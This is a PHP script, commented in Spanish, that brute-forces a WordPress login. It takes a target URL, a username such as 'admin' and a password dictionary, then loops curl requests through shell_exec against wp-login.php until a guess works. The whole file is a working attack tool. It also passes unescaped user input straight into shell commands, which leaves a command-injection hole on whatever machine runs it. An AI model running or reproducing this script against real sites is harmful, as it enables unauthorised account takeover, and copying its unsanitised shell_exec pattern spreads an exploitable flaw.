<?php
//Editamos los datos de nuestro objetivo, la url donde se enviarán las peticiones
//$url = 'www.web/wp-login.php';
//Usuario sobre el que lanzaremos el ataque
//$usuario = 'admin';
//El archivo que contiene las contraseñas (Diccionario)
//$archivo_passwords = 'passwords.txt';
//String que aparece en la página de login pero NO en la de OK
//$string_valido = 'Acceder';
//Tiempo entre peticiones (segundos)
//$tiempo_espera=1;

if(isset($_POST['url']) && isset($_POST['usuario']) && isset($_POST['archivo']) && isset($_POST['string']) && isset($_POST['tiempo'])){
	$url=$_POST['url'];
	$usuario=$_POST['usuario'];
	$archivo_passwords=$_POST['archivo'];
	$string_valido=$_POST['string'];
	$tiempo_espera=$_POST['tiempo'];
}

//Obtenemos las cookies y las almacenamos en cookie1.txt
$get_cookies ='curl -D cookie1.txt '.$url;
$salida1 = shell_exec($get_cookies);

//Funcion que lee nuestro $archivo_passwords
function procesar_archivo($archivo){
   if(empty($archivo)||!file_exists($archivo)){return false;}
   $handle = fopen($archivo,'r');
   $content = fread($handle,filesize($archivo));
   $content = explode("\n",$content);
   fclose($handle);
   return $content;
}
// Procesamos el archivo.
$passwords = procesar_archivo($archivo_passwords);
if(empty($passwords)||!is_array($passwords)){die('El archivo no existe y/o no es valido');}

//Bucle para lanzar las peticiones hasta dar con una password correcta
foreach($passwords as $password){
	//A partir de las cookies1 hacemos otra petición enviando los datos necesarios por post y almacenando las cookies en cookie2.txt
	$peticion_wp='curl -L -D cookie2.txt -b cookie1.txt -d "log='.$usuario.'&pwd='.$password.'&testcookie=1&rememberme=forever" '.$url;
	$salida2 = shell_exec($peticion_wp);
	//Si en el resultado está la palabra &string_valido es que no has entrado
	if(strpos($salida2, $string_valido) == true){
		echo $password." - No has entrado<br>";
	}
	else{
		echo $password." - <b>Has entrado</b><br>";
		break;
	} 
	sleep($tiempo_espera);
}
?>